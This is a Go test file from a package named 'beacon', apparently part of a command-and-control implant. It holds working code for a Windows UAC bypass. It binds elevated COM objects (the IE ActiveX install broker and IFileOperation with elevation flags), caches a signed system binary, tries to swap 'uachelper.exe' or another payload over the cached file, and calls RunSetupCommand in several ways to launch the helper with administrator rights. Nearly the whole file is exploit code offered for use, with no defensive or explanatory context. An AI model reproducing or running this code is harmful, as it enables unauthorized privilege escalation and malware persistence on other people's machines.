package beacon

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procCoInitializeSecurity        = ole32.NewProc("CoInitializeSecurity")
	procSHCreateItemFromParsingName = windows.NewLazySystemDLL("shell32.dll").NewProc("SHCreateItemFromParsingName")
)

type iunknownVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
}

type iunknownIface struct {
	lpVtbl *iunknownVtbl
}

type ieaAdminBrokerVtbl struct {
	QueryInterface           uintptr
	AddRef                   uintptr
	Release                  uintptr
	InitializeAdminInstaller uintptr
}

type ieaAdminBrokerIface struct {
	lpVtbl *ieaAdminBrokerVtbl
}

type ieaInstallBrokerVtbl struct {
	QueryInterface  uintptr
	AddRef          uintptr
	Release         uintptr
	VerifyFile      uintptr
	RunSetupCommand uintptr
}

type ieaInstallBrokerIface struct {
	lpVtbl *ieaInstallBrokerVtbl
}

type ifileOperationVtbl struct {
	QueryInterface          uintptr
	AddRef                  uintptr
	Release                 uintptr
	SetOperationFlags       uintptr
	SetProgressMessage      uintptr
	SetProgressDialog       uintptr
	SetProperties           uintptr
	SetApplyPropertiesTo    uintptr
	CopyItem                uintptr
	CopyItems               uintptr
	MoveItem                uintptr
	MoveItems               uintptr
	RenameItem              uintptr
	RenameItems             uintptr
	DeleteItem              uintptr
	DeleteItems             uintptr
	NewItem                 uintptr
	PerformOperations       uintptr
	GetAnyOperationsAborted uintptr
}

type ifileOperationIface struct {
	lpVtbl *ifileOperationVtbl
}

type ishellItemIface struct {
	lpVtbl *iunknownVtbl
}

const fopFlags = 0x10 | 0x20000 | 0x10000000 // NOCONFIRMATION|NOCOPYHOOKS|REQUIREELEVATION

func sysAllocStringPtr(p *uint16) uintptr {
	r1, _, _ := procSysAllocString.Call(uintptr(unsafe.Pointer(p)))
	return r1
}

func bstrToString(b uintptr) string {
	if b == 0 {
		return ""
	}
	lenPtr := (*uint32)(unsafe.Pointer(b - 4))
	return syscall.UTF16ToString(unsafe.Slice((*uint16)(unsafe.Pointer(b)), int(*lenPtr)/2))
}

func comRelease(p unsafe.Pointer) {
	if p != nil {
		syscall.Syscall((*iunknownIface)(p).lpVtbl.Release, 1, uintptr(p), 0, 0)
	}
}

func bindElevatedOpts(clsid, iid string, ctx uint32) (unsafe.Pointer, error) {
	monPtr, err := syscall.UTF16PtrFromString("Elevation:Administrator!new:{" + clsid + "}")
	if err != nil {
		return nil, err
	}
	iidG, err := guidFromString(iid)
	if err != nil {
		return nil, err
	}
	var p unsafe.Pointer
	var r1 uintptr
	if ctx != 0 {
		b := bindOpts3{cbStruct: uint32(unsafe.Sizeof(bindOpts3{})), dwClassContext: ctx}
		r1, _, _ = procCoGetObject.Call(uintptr(unsafe.Pointer(monPtr)), uintptr(unsafe.Pointer(&b)), uintptr(unsafe.Pointer(&iidG)), uintptr(unsafe.Pointer(&p)))
	} else {
		r1, _, _ = procCoGetObject.Call(uintptr(unsafe.Pointer(monPtr)), 0, uintptr(unsafe.Pointer(&iidG)), uintptr(unsafe.Pointer(&p)))
	}
	if r1 != 0 {
		return nil, fmt.Errorf("bind 0x%08x", uint32(r1))
	}
	return p, nil
}

func bindElevated(clsid, iid string) (unsafe.Pointer, error) {
	return bindElevatedOpts(clsid, iid, 0)
}

func fopShellItem(path string) (unsafe.Pointer, error) {
	iidShellItem, _ := guidFromString("43826d1e-e718-42ee-bc55-a1e261c37bfe")
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return nil, err
	}
	var item unsafe.Pointer
	r1, _, _ := procSHCreateItemFromParsingName.Call(uintptr(unsafe.Pointer(p)), 0, uintptr(unsafe.Pointer(&iidShellItem)), uintptr(unsafe.Pointer(&item)))
	if r1 != 0 {
		return nil, fmt.Errorf("SHCreateItem 0x%08x", uint32(r1))
	}
	return item, nil
}

func fopOp(op func(fop *ifileOperationIface, src, dst unsafe.Pointer) uintptr, srcPath, dstDir string) error {
	fop, err := bindElevatedOpts("3AD05575-8857-4850-9277-11B85BDB8E09", "9AC9FBE1-E0A2-4AD6-B4EE-E212013EA917", 0x4)
	if err != nil {
		return fmt.Errorf("fop bind: %w", err)
	}
	fopI := (*ifileOperationIface)(fop)
	defer comRelease(fop)
	r1, _, _ := syscall.Syscall(fopI.lpVtbl.SetOperationFlags, 3, uintptr(fop), fopFlags, 0)
	if r1 != 0 {
		return fmt.Errorf("SetOperationFlags 0x%08x", uint32(r1))
	}
	src, err := fopShellItem(srcPath)
	if err != nil {
		return err
	}
	defer comRelease(src)
	var dst unsafe.Pointer
	if dstDir != "" {
		dst, err = fopShellItem(dstDir)
		if err != nil {
			return err
		}
		defer comRelease(dst)
	}
	r1 = op(fopI, src, dst)
	if r1 != 0 {
		return fmt.Errorf("op 0x%08x", uint32(r1))
	}
	r1, _, _ = syscall.Syscall(fopI.lpVtbl.PerformOperations, 1, uintptr(fop), 0, 0)
	if r1 != 0 {
		return fmt.Errorf("PerformOperations 0x%08x", uint32(r1))
	}
	return nil
}

func fopDeleteFile(path string) error {
	return fopOp(func(fop *ifileOperationIface, src, dst unsafe.Pointer) uintptr {
		r, _, _ := syscall.Syscall6(fop.lpVtbl.DeleteItem, 5, uintptr(unsafe.Pointer(fop)), uintptr(src), 0, 0, 0, 0)
		return r
	}, path, "")
}

func fopMoveFile(srcPath, dstDir string) error {
	return fopOp(func(fop *ifileOperationIface, src, dst unsafe.Pointer) uintptr {
		r, _, _ := syscall.Syscall6(fop.lpVtbl.MoveItem, 5, uintptr(unsafe.Pointer(fop)), uintptr(src), uintptr(dst), 0, 0, 0)
		return r
	}, srcPath, dstDir)
}

func TestDbgIEInstal(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	r1, _, _ := procCoInitializeSecurity.Call(0, 0xFFFFFFFF, 0, 0, 2, 3, 0, 0, 0)
	t.Logf("CoInitializeSecurity -> 0x%08x (RPC_E_TOO_LATE=0x80010119 ok)", uint32(r1))

	broker, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "9AEA8A59-E0C9-40F1-87DD-757061D56177")
	if err != nil {
		t.Fatalf("broker bind: %v", err)
	}
	brokerI := (*ieaAdminBrokerIface)(broker)
	defer comRelease(broker)

	var uuidBstr uintptr
	r1, _, _ = syscall.Syscall9(brokerI.lpVtbl.InitializeAdminInstaller, 4, uintptr(broker), 0, 0, uintptr(unsafe.Pointer(&uuidBstr)), 0, 0, 0, 0, 0)
	if r1 != 0 {
		t.Fatalf("InitializeAdminInstaller 0x%08x", uint32(r1))
	}
	uuid := bstrToString(uuidBstr)
	t.Logf("instance uuid: %s", uuid)
	defer procSysFreeString.Call(uuidBstr)

	iidInst2, _ := guidFromString("BC0EC710-A3ED-4F99-B14F-5FD59FDACEA3")
	var inst unsafe.Pointer
	r1, _, _ = syscall.Syscall(brokerI.lpVtbl.QueryInterface, 3, uintptr(broker), uintptr(unsafe.Pointer(&iidInst2)), uintptr(unsafe.Pointer(&inst)))
	if r1 != 0 {
		t.Fatalf("QI IEAxiInstaller2 0x%08x", uint32(r1))
	}
	instI := (*ieaInstallBrokerIface)(inst)
	defer comRelease(inst)

	consentBstr := sysAllocStringPtr(mustUTF16(`C:\Windows\System32\bdeunlock.exe`))
	defer procSysFreeString.Call(consentBstr)
	iidUnk, _ := guidFromString("00000000-0000-0000-C000-000000000046")
	var cacheBstr uintptr
	var certLen uint32
	var certPtr unsafe.Pointer
	r1, _, _ = syscall.Syscall12(instI.lpVtbl.VerifyFile, 12,
		uintptr(inst), uuidBstr, 0xFFFFFFFFFFFFFFFF, consentBstr, consentBstr, 0,
		1, 0x10, uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&cacheBstr)),
		uintptr(unsafe.Pointer(&certLen)), uintptr(unsafe.Pointer(&certPtr)))
	if r1 != 0 {
		t.Fatalf("VerifyFile 0x%08x", uint32(r1))
	}
	cachePath := bstrToString(cacheBstr)
	t.Logf("verified cache: %s", cachePath)
	defer procSysFreeString.Call(cacheBstr)

	dir := filepath.Dir(cachePath)
	out, _ := exec.Command("icacls", dir).CombinedOutput()
	t.Logf("cache dir acls: %s", out)

	probe := filepath.Join(dir, "probe.txt")
	if err := os.WriteFile(probe, []byte("x"), 0644); err != nil {
		t.Logf("dir CREATE file: FAIL %v", err)
	} else {
		t.Log("dir CREATE file: OK")
		os.Remove(probe)
	}
	if err := os.Rename(filepath.Join(os.Getenv("TEMP"), "uachelper.exe"), cachePath); err != nil {
		t.Logf("RENAME-over cached file: FAIL %v", err)
	} else {
		t.Log("RENAME-over cached file: OK")
	}
	if _, err := os.Stat(cachePath); err != nil {
		t.Log("cache file GONE after rename")
	} else {
		t.Log("cache file still present after rename attempt")
	}

	base := filepath.Base(cachePath)
	payloadTemp := filepath.Join(os.Getenv("TEMP"), base)
	if err := os.Rename(payloadTemp, cachePath); err == nil {
		t.Log("payload REPLACED via plain rename")
	} else {
		t.Logf("plain rename into cache dir: FAIL %v", err)
	}
	emptyB := sysAllocStringPtr(mustUTF16(""))
	defer procSysFreeString.Call(emptyB)
	workdirB := sysAllocStringPtr(mustUTF16(os.Getenv("TEMP")))
	defer procSysFreeString.Call(workdirB)
	helperPath := filepath.Join(os.Getenv("TEMP"), "uachelper.exe")
	helperB := sysAllocStringPtr(mustUTF16(helperPath))
	defer procSysFreeString.Call(helperB)
	helperFwd := strings.ReplaceAll(helperPath, "\\", "/")
	helperFwdB := sysAllocStringPtr(mustUTF16(helperFwd))
	defer procSysFreeString.Call(helperFwdB)

	runSetup := func(label, cmd, section string) uint32 {
		cmdB := sysAllocStringPtr(mustUTF16(cmd))
		defer procSysFreeString.Call(cmdB)
		sectionB := sysAllocStringPtr(mustUTF16(section))
		defer procSysFreeString.Call(sectionB)
		var ph uintptr
		r1, _, _ := syscall.Syscall12(instI.lpVtbl.RunSetupCommand, 9,
			uintptr(inst), uuidBstr, 0, cmdB, sectionB, workdirB, emptyB, 4, uintptr(unsafe.Pointer(&ph)), 0, 0, 0)
		t.Logf("RunSetupCommand[%s] -> 0x%08x", label, uint32(r1))
		return uint32(r1)
	}

	runSetup("cache-alone", cachePath, "")
	runSetup("cache+abs-path", cachePath+" "+helperPath, "")
	runSetup("cache+fwd-path", cachePath+" "+helperFwd, "")
	runSetup("unrelated", helperPath, "")
	runSetup("cache+cmd-wrapper", "cmd /c "+helperPath, "")

	msiB := sysAllocStringPtr(mustUTF16(`C:\Windows\System32\msiexec.exe`))
	defer procSysFreeString.Call(msiB)
	var mCache uintptr
	var mCertLen uintptr
	var mCertPtr uintptr
	r1, _, _ = syscall.Syscall12(instI.lpVtbl.VerifyFile, 12,
		uintptr(inst), uuidBstr, 0xFFFFFFFFFFFFFFFF, msiB, msiB, 0,
		1, 0x10, uintptr(unsafe.Pointer(&iidUnk)), uintptr(unsafe.Pointer(&mCache)),
		uintptr(unsafe.Pointer(&mCertLen)), uintptr(unsafe.Pointer(&mCertPtr)))
	t.Logf("VerifyFile(msiexec) -> 0x%08x cache=%v", uint32(r1), mCache != 0)
	if mCache != 0 {
		defer procSysFreeString.Call(mCache)
	}
	fmt.Println("done")
}

func mustUTF16(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}
